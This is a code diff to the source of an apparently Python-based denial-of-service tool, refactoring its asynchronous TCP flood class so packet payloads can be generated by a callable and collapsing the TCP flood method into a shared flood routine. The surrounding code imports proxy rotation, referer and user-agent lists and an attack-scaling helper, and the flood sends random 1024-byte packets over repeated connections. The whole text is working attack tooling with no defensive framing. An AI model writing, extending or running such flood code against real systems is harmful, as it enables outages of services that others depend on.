@@ -35,6 +35,7 @@ from .proxies import ProxySet, NoProxySet
 from . import proto
 from . import proxy_tools as ProxyTools
 from .concurrency import scale_attack
+from .core import PacketPayload
 from .referers import REFERERS
 from .useragents import USERAGENTS
 from .rotate import suffix as rotate_suffix, params as rotate_params
@@ -743,14 +744,26 @@ class AsyncTcpFlood(HttpFlood):
                 await writer.drain()
         self._stats.track(1, len(payload))
 
-    async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
+    async def _generic_flood(
+        self,
+        payload: PacketPayload,
+        *,
+        rpc: Optional[int] = None
+    ) -> bool:
         if self._settings.transport == AttackSettings.TRANSPORT_PROTO:
             return await self._generic_flood_proto(payload, rpc=rpc)
         else:
             return await self._generic_flood_stream(payload, rpc=rpc)
 
-    async def _generic_flood_stream(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
+    async def _generic_flood_stream(
+        self,
+        payload: PacketPayload,
+        *,
+        rpc: Optional[int] = None
+    ) -> bool:
         rpc = rpc or self._settings.requests_per_connection
+        if not isinstance(payload, bytes):
+            payload = payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await self.open_connection()
         if hasattr(writer.transport, "pause_reading"):
@@ -763,7 +776,13 @@ class AsyncTcpFlood(HttpFlood):
             await self._close_connection(writer)
         return packets_sent > 0
     
-    async def _generic_flood_proto(self, payload: bytes, *, rpc: Optional[int] = None) -> bool:
+    async def _generic_flood_proto(
+        self,
+        payload: PacketPayload,
+        *,
+        rpc: Optional[int] = None
+    ) -> bool:
+        # XXX: most of this code should be inside proto module
         on_done = self._loop.create_future()
         proxy_url: str = self._proxies.pick_random()
         proxy = Proxy.from_url(proxy_url)
@@ -991,21 +1010,11 @@ class AsyncTcpFlood(HttpFlood):
             await self._close_connection(writer)
         return packets_sent > 0
 
+    # XXX: ideally we want to reduce high watermark here
     async def TCP(self) -> bool:
-        packets_sent, packet_size = 0, 1024
-        if self._settings.transport == AttackSettings.TRANSPORT_PROTO:
-            payload: bytes = randbytes(packet_size)
-            return await self._generic_flood_proto(payload)
-        else:
-            reader, writer = await self.open_connection()
-            try:
-                for _ in range(self._settings.requests_per_connection):
-                    payload: bytes = randbytes(packet_size)
-                    await self._send_packet(writer, payload)
-                    packets_sent += 1
-            finally:
-                await self._close_connection(writer)
-            return packets_sent > 0
+        packet_size = 1024
+        return await self._generic_flood(partial(randbytes, packet_size))
+
 
 class AsyncUdpFlood(Layer4):
 
